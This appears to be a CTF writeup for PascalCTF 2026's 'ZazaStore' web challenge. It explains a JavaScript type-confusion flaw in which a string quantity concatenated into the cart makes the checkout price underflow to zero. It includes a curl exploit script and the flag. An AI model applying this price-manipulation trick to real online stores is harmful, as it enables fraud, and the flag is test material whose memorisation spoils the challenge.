@@ -1,0 +1,93 @@
+---
+title: 'PascalCTF 2026 - ZazaStore'
+description: 'Writeup for ZazaStore from PascalCTF 2026. A Web challenge involving Type Confusion and Logic Flaw.'
+date: 2026-02-01
+tags: ['writeup', 'web', 'type-confusion', 'logic-flaw', 'pascalctf']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+
+**Challenge Name:** ZazaStore
+**Category:** Web
+**Flag:** `pascalCTF{w3_l1v3_f0r_th3_z4z4}`
+
+## 🔍 Analysis
+
+The challenge is a pizza shop simulation where the goal is to buy "RealZa".
+- **RealZa Cost:** 1000
+- **Starting Balance:** 100
+- **Goal:** Buy RealZa despite insufficient balance.
+
+The application allows adding items to a cart and then checking out. Authentication is handled via a simple login.
+
+### Vulnerability: Type Confusion / String Concatenation
+
+The vulnerability lies in the `/add-cart` endpoint logic:
+
+```javascript
+app.post('/add-cart', (req, res) => {
+    // ...
+    const quantity = product.quantity || 1;
+    if (quantity < 1) { // Weak check allows non-numeric strings that compare oddly or NaN
+        return res.json({ success: false });
+    }
+    if (prod in cart) {
+        cart[prod] += quantity; // VULNERABILITY: += Operator can do string concatenation!
+    } else {
+        cart[prod] = quantity;
+    }
+    // ...
+});
+```
+
+If we send `quantity` as a string (e.g., `"e-1000"`), the check `quantity < 1` passes (because `NaN < 1` is false).
+If we add the item *twice*:
+1. First add: `cart['RealZa'] = 1` (number)
+2. Second add: `cart['RealZa'] += "e-1000"` -> Result is string `"1e-1000"`
+
+At `/checkout`, the total price is calculated:
+```javascript
+total += prices[product] * cart[product];
+```
+`1000 * "1e-1000"` evaluates to `1000 * 10^-1000`, which underflows resulting in `0`.
+
+## 🔓 Solution
+
+1. **Login** to create a session.
+2. **Add RealZa (quantity 1)**: Initializes cart with a number.
+3. **Add RealZa (quantity "e-1000")**: Triggers string concatenation, turning quantity into `"1e-1000"`.
+4. **Checkout**: Total calculates to 0, allowing the purchase.
+5. **Check Inventory**: The flag is delivered in the inventory page.
+
+### Exploit Script (Bash/Curl)
+
+```bash
+# 1. Login
+curl -c cookies.txt -X POST https://zazastore.ctf.pascalctf.it/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test","password":"test"}'
+
+# 2. Add normal quantity
+curl -b cookies.txt -X POST https://zazastore.ctf.pascalctf.it/add-cart \
+  -H "Content-Type: application/json" \
+  -d '{"product":"RealZa","quantity":1}'
+
+# 3. Add string quantity to cause concatenation
+curl -b cookies.txt -X POST https://zazastore.ctf.pascalctf.it/add-cart \
+  -H "Content-Type: application/json" \
+  -d '{"product":"RealZa","quantity":"e-1000"}'
+
+# 4. Checkout (Total cost = 0)
+curl -b cookies.txt -X POST https://zazastore.ctf.pascalctf.it/checkout
+
+# 5. Retrieve Flag
+curl -b cookies.txt https://zazastore.ctf.pascalctf.it/inventory
+```
+
+## Flag
+
+```text
+pascalCTF{w3_l1v3_f0r_th3_z4z4}
+```
